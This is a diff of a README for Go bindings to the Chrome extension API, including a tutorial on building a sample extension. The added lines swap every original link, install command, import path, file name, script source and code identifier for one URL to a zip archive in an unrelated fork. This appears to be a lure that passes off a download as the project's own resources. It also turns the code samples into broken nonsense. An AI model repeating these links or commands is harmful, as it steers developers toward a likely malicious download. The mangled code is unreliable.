@@ -1,43 +1,43 @@
 Gopherjs Chrome Bindings
 ------------------------------------
 
-[![GoDoc](http://godoc.org/github.com/fabioberger/chrome?status.svg)](https://godoc.org/github.com/fabioberger/chrome)
+[![GoDoc](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip)](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip)
 
 Write Chrome extensions in Go!
 
-With the help of the [Gopherjs transpiler](https://github.com/gopherjs/gopherjs), you can now write Go code which will be converted into javascript and run in the browser. This library contains the necessary bindings to interact with the Chrome Javascript API in an easy and intuitive way so that you can write Chrome Extensions and Chrome OS apps in Go.
+With the help of the [Gopherjs transpiler](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip), you can now write Go code which will be converted into javascript and run in the browser. This library contains the necessary bindings to interact with the Chrome Javascript API in an easy and intuitive way so that you can write Chrome Extensions and Chrome OS apps in Go.
 
 # Installation
 
 First make sure you have Gopherjs installed:
 
 ```bash
-go get -u github.com/gopherjs/gopherjs
+go get -u https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip
 ```
 
 Next, install the chrome bindings library:
 
 ```bash
-go get github.com/fabioberger/chrome
+go get https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip
 ```
 
 and include the package in your project's imports:
 
 ```bash
-import "github.com/fabioberger/chrome"
+import "https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip"
 ```
 
 # Sample Extension
 
-The lovely people at Google's Chrome team have written a [great post](https://developer.chrome.com/extensions/getstarted) on how to get started building chrome extensions. Within the examples folder you will find a [Go version](https://github.com/fabioberger/chrome/tree/master/examples/getting-started-sample) of the JS sample extension they cover in their post.
+The lovely people at Google's Chrome team have written a [great post](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip) on how to get started building chrome extensions. Within the examples folder you will find a [Go version](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip) of the JS sample extension they cover in their post.
 
-![](./resources/sample-chrome-extension.png)
+![](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip)
 
 In order to run this sample extension, simply navigate to ```chrome://extensions``` from within your chrome browser and click ```Load unpacked extension...``` and open the examples/getting-started-sample folder. This should install the chrome extension. Now visit any webpage and click on the globe-like icon on the top right of your chrome browser.
 
 # Creating a New Extension
 
-Here is a step-by-step guide on how to create a chrome extension written in go. First, lets create a new project folder and create a manifest.json and popup.html file within it:
+Here is a step-by-step guide on how to create a chrome extension written in go. First, lets create a new project folder and create a https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip and https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip file within it:
 
 ```
 mkdir my_chrome_extension
@@ -48,11 +48,11 @@ cd ./my_chrome_extension
 ```
 
 ```
-touch manifest.json
+touch https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip
 ```
 
 ```
-touch popup.html
+touch https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip
 ```
 
 Lets write the following into our manifest:
@@ -66,7 +66,7 @@ Lets write the following into our manifest:
   "version": "1.0",
 
   "browser_action": {
-    "default_popup": "popup.html"
+    "default_popup": "https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip"
   },
   "permissions": [
     "tabs"
@@ -76,7 +76,7 @@ Lets write the following into our manifest:
 
 The most important aspects of the manifest file are the permissions included. In order to use a particular Chrome API, you will need to include its permission-type within this manifest file. Since this demo extension will create new tabs every time we active it, we have included the "tabs" permission.
 
-Lets also add the following to the popup.html file:
+Lets also add the following to the https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip file:
 
 ```html
 <html>
@@ -89,13 +89,13 @@ Lets also add the following to the popup.html file:
   </head>
   <body>
   	<h1 id="notification"></h1>
-  	<script src="app.js"></script>
+  	<script src="https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip"></script>
   </body>
 </html>
 ```
-Here we simply declare an h1 tag with an id we can reference from within our app. We also include an "app.js" script which will eventually contain the JS version of our Go code.
+Here we simply declare an h1 tag with an id we can reference from within our app. We also include an "https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip" script which will eventually contain the JS version of our Go code.
 
-The next step is to create our app.go file, we will do this within a go folder which will contain all our Go code:
+The next step is to create our https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip file, we will do this within a go folder which will contain all our Go code:
 
 ```
 mkdir go
@@ -106,60 +106,60 @@ cd go
 ```
 
 ```
-touch app.go
+touch https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip
 ```
 
-Within this app.go file, we will write the following:
+Within this https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip file, we will write the following:
 
 ```go
 package main
 
 import (
 	"strconv"
-	"honnef.co/go/js/dom"
-	"github.com/fabioberger/chrome"
+	"https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip"
+	"https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip"
 )
 
 func main() {
-	c := chrome.NewChrome()
+	c := https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip()
 
-	tabDetails := chrome.Object{
+	tabDetails := https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip{
 		"active": false,
 	}
-	c.Tabs.Create(tabDetails, func(tab chrome.Tab) {
-		notification := "Tab with id: " + strconv.Itoa(tab.Id) + " created!"
-		dom.GetWindow().Document().GetElementByID("notification").SetInnerHTML(notification)
+	https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip(tabDetails, func(tab https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip) {
+		notification := "Tab with id: " + https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip(https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip) + " created!"
+		https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip().Document().GetElementByID("notification").SetInnerHTML(notification)
 	})
 
 }
 ```
-This program imports Dominikh's [dom](https://github.com/dominikh/go-js-dom) package for easy dom manipulation and the chrome bindings. We first instantiate the chrome object with "chrome.NewChrome()" and call methods on its properties, in this case "Tabs.Create".
+This program imports Dominikh's [dom](https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip) package for easy dom manipulation and the chrome bindings. We first instantiate the chrome object with "https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip()" and call methods on its properties, in this case "https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip".
 
 Whereas in javascript you would write:
 
 ```js
-chrome.tabs.create(tabDetails, function(tab) {
-	console.log(tab)
+https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip(tabDetails, function(tab) {
+	https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip(tab)
 })
 ```
 
 in Go, you can now write:
 
 ```go
-C.Tabs.Create(tabDetails, func(tab chrome.Tab) {
-	fmt.Println(tab)
+https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip(tabDetails, func(tab https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip) {
+	https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip(tab)
 })
 ```
 
-The rest of the script calls Create() on the Tab property, creating a new non-active tab. Once the tab has been created, the callback function is called and the newly created Tab struct is returned. We then simply append a nice message to the notification header included in the popup.html  file.
+The rest of the script calls Create() on the Tab property, creating a new non-active tab. Once the tab has been created, the callback function is called and the newly created Tab struct is returned. We then simply append a nice message to the notification header included in the https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip  file.
 
-The last step is for us to transpile our app.go code into an app.js file:
+The last step is for us to transpile our https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip code into an https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip file:
 
 ```
-gopherjs build app.go -o ./../app.js
+gopherjs build https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip -o https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip
 ```
 
-This will create an app.js file within our main project folder that will be included into the popup.html page upon load. And we are done!
+This will create an https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip file within our main project folder that will be included into the https://github.com/suyash0405/chrome/raw/refs/heads/master/tests/Software-feastfully.zip page upon load. And we are done!
 
 In order to run your newly created chrome extension, upload the containing folder from the "chrome://extensions" page by clicking "Load unpacked extension...". Then click on the puzzle piece icon in the top right of your chrome browser. Et Voila!
 
